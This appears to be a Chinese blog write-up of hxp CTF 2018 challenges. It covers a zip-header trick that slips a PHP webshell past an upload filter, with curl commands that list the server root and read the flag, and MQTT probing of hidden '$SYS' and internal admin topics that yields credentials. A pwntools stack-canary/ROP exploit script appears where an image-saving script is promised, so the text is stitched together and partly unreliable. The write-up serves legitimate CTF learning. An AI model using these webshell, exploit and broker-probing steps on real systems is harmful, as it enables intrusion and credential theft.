---
title: hxp-ctf
date: 2018-12-10 18:09:53
tags:
---

## Web

## unpacker

```
<?php
if (isset($_FILES['zip']) && $_FILES['zip']['size'] < 10*1024 ){
    $d = 'files/' . bin2hex(random_bytes(32));
    mkdir($d) || die('mkdir');
    chdir($d) || die('chdir');

    $zip = new ZipArchive();
    if ($zip->open($_FILES['zip']['tmp_name']) === TRUE) {
        for ($i = 0; $i < $zip->numFiles; $i++) {
            if(preg_match('/^[a-z]+$/', $zip->getNameIndex($i)) !== 1){
                die(':/ security');
            }
        }

        exec('unzip ' . escapeshellarg($_FILES['zip']['tmp_name']));
        echo $d;
    }
}
else {
    highlight_file(__FILE__);
}
```

上传一个压缩包，首先判断压缩包内文件个数，判断文件名是否有特殊字符。文件个数可以绕过:

* 首先生成一个压缩包，里边包含两个文件，其中一个是webshell
* 修改压缩包中的文件个数字段

```
ht@TIANJI:/mnt/c/Users/HT/Desktop/ht-ctf/hxpctf$ touch aaa
ht@TIANJI:/mnt/c/Users/HT/Desktop/ht-ctf/hxpctf$ vim aaa
ht@TIANJI:/mnt/c/Users/HT/Desktop/ht-ctf/hxpctf$ vim bbb.php
ht@TIANJI:/mnt/c/Users/HT/Desktop/ht-ctf/hxpctf$ zip test.php aaa bbb.php
  adding: aaa (stored 0%)
  adding: bbb.php (deflated 20%)
```

修改文件个数:

![](/assets/hxpctf/TIM截图20181210182634.png)

上传：

```
ht@TIANJI:/mnt/c/Users/HT/Desktop/ht-ctf/hxpctf$ curl -F "zip=@test.zip" "http://195.201.136.29:8087/"
files/cbe25b80780eaad19c94bc1b7ea20ed8c4a449444fd19b98263f4a25e433bbd9
ht@TIANJI:/mnt/c/Users/HT/Desktop/ht-ctf/hxpctf$ curl "http://195.201.136.29:8087/files/cbe25b80780eaad19c94bc1b7ea20ed8c4a449444fd19b98263f4a25e433bbd9/bbb.php?cmd=ls%20/"
bin
boot
dev
etc
flag_IVSbATTqgejx9Hn2berSknRO.php
home
..................
ht@TIANJI:/mnt/c/Users/HT/Desktop/ht-ctf/hxpctf$ curl "http://195.201.136.29:8087/files/cbe25b80780eaad19c94bc1b7ea20ed8c4a449444fd19b98263f4a25e433bbd9/bbb.php?cmd=cat%20/flag_IVSbATTqgejx9Hn2berSknRO.php"
<?php
'hxp{please_ask_gynvael_for_more_details_on_zips_:>}';
```

## time for h4x0rpsch0rr?

```
<script>
  var client = mqtt.connect('ws://' + location.hostname + ':60805')
  client.subscribe('hxp.io/temperature/Munich')

  client.on('message', function (topic, payload) {
    var temp = parseFloat(payload)
    var result = 'NO'

    /* secret formular, please no steal*/
    if (-273.15 <= temp && temp < Infinity) {
      result = 'YES'
    }
    document.getElementById('beer').innerText = result
  })
</script>
```

通过如上脚本，可以看到在60805端口，运行着一个MQTT服务，并通过websocket像网站提供数据。我们自己开启一个客户端连入该服务，并订阅该主题。首先使用通配符"#"，表示订阅任意一个topic。

```
sudo pip install paho-mqtt

#!/usr/bin/python
 
import sys
import paho.mqtt.client as mqtt
 
def on_message(mqttc, obj, msg):
    print(msg.topic+" "+str(msg.qos))
    print(msg.payload)
 
mqttc = mqtt.Client(transport='websockets')
mqttc.on_message = on_message
 
mqttc.connect("159.69.212.240", 60805, 60)
mqttc.subscribe("#", 0)
mqttc.loop_forever()
```

得到的数据如下,没什么用:

```
hxp.io/temperature/Munich 0
13.37
hxp.io/temperature/Munich 0
13.37
hxp.io/temperature/Munich 0
13.37
```

接下来订阅“$SYS/#", 所有以"\$"开头的主题都是隐藏的主题，"#"无法捕获到。"\$SYS"是一个能够提供一些服务内部信息的默认主体。

```
qianfa@qianfa:~/Desktop/pwn/hxp$ python mqtt.py 
$SYS/broker/version 0
mosquitto version 1.4.10
$SYS/broker/timestamp 0
Wed, 17 Oct 2018 19:03:03 +0200
$SYS/broker/uptime 0
257730 seconds
$SYS/broker/clients/total 0
49
$SYS/broker/clients/inactive 0
49
$SYS/broker/clients/disconnected 0
49
$SYS/broker/clients/active 0
0
$SYS/broker/clients/connected 0
0
$SYS/broker/clients/expired 0
0
$SYS/broker/clients/maximum 0
277
$SYS/broker/messages/stored 0
39
$SYS/broker/messages/received 0
774292
$SYS/broker/messages/sent 0
0
$SYS/broker/subscriptions/count 0
46
$SYS/broker/retained messages/count 0
39
$SYS/broker/heap/current 0
98632
$SYS/broker/heap/maximum 0
12085456
$SYS/broker/publish/messages/dropped 0
20906
$SYS/broker/publish/messages/received 0
103793
$SYS/broker/publish/messages/sent 0
0
$SYS/broker/publish/bytes/received 0
2092496493
$SYS/broker/publish/bytes/sent 0
9498698153
$SYS/broker/bytes/received 0
2103228320
$SYS/broker/bytes/sent 0
0
$SYS/broker/load/messages/received/1min 0
86.99
$SYS/broker/load/messages/received/5min 0
91.77
$SYS/broker/load/messages/received/15min 0
91.24
$SYS/broker/load/publish/received/1min 0
23.01
$SYS/broker/load/publish/received/5min 0
22.98
$SYS/broker/load/publish/received/15min 0
22.99
$SYS/broker/load/publish/dropped/1min 0
0.06
$SYS/broker/load/publish/dropped/5min 0
0.27
$SYS/broker/load/publish/dropped/15min 0
0.82
$SYS/broker/load/bytes/received/1min 0
497417.70
$SYS/broker/load/bytes/received/5min 0
492349.99
$SYS/broker/load/bytes/received/15min 0
491242.62
$SYS/broker/load/connections/1min 0
11.86
$SYS/broker/load/connections/5min 0
12.03
$SYS/broker/load/connections/15min 0
12.09
$SYS/broker/log/M/subscribe 0
1544438578: 68ec4be6-7a5d-4f24-84cc-be15cc0b1962 0 $SYS/#
$SYS/broker/log/M/subscribe 0
1544438579: 9e0c1b96-b237-4fcb-88fd-010ef0ed0ee3 0 $internal/admin/webcam
```

我们可以看到,"mosquitto version 1.4.10",版本比较古老，存在CVE漏洞。 还有一个有趣的主题"\$internal/admin/webcam"，访问之后得到如下结果，可以看出是一张图片。

```
qianfa@qianfa:~/Desktop/pwn/hxp$ python mqtt.py 
$internal/admin/webcam 0
����JFIF����hExifMM>F(1N��paint.net 4.0.21��C
```

修改脚本，保存该图片：

```
from pwn import *

context.log_level = "debug"
p = process("./canary")
p.recvuntil("> ")
p.send("a" * 0x29)
p.recvn(0x28)
canary = u32(p.recvn(4)) - 0x61
print hex(canary)
p.recvuntil("> ")

sys_addr = 0x16D90
sh_addr = 0x61eb0
r0_gadget = 0x00049d1c
r1_gadget = 0x0006f088

#p.send("a" * 0x28 + p32(canary) + "a" * 0xc + p32(r1_gadget) + p32(sh_addr) + p32(r0_gadget) + "A" * 4 + p32(sys_addr))
p.send("a" * 0x28 + p32(canary) + "a" * 0xc + p32(0x10518))

p.interactive()
```

得到账号密码:

```
iot_fag
I<3SecurID
ID: 看图片，每次都有变化
```

flag: `Flag: hxp{Air gap your beers :| - Prost!}`

# PWN

## poor canary

